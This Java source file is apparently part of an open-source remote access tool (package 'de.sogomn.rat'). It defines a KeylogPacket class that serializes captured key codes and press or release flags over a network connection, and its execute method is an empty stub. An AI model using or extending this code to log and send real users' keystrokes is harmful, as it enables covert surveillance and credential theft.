/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import org.jnativehook.keyboard.NativeKeyEvent;

import de.sogomn.rat.ActiveConnection;

public final class KeylogPacket implements IPacket {
	
	private int keyCode;
	private byte flag;
	
	public static final byte PRESSED = 0;
	public static final byte RELEASED = 1;
	
	public KeylogPacket(final int keyCode, final byte flag) {
		this.keyCode = keyCode;
		this.flag = flag;
	}
	
	public KeylogPacket() {
		this(NativeKeyEvent.VC_UNDEFINED, (byte)-1);
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeInt(keyCode);
		connection.writeByte(flag);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		keyCode = connection.readInt();
		flag = connection.readByte();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		//...
	}
	
	public int getKeyCode() {
		return keyCode;
	}
	
	public byte getFlag() {
		return flag;
	}
	
}
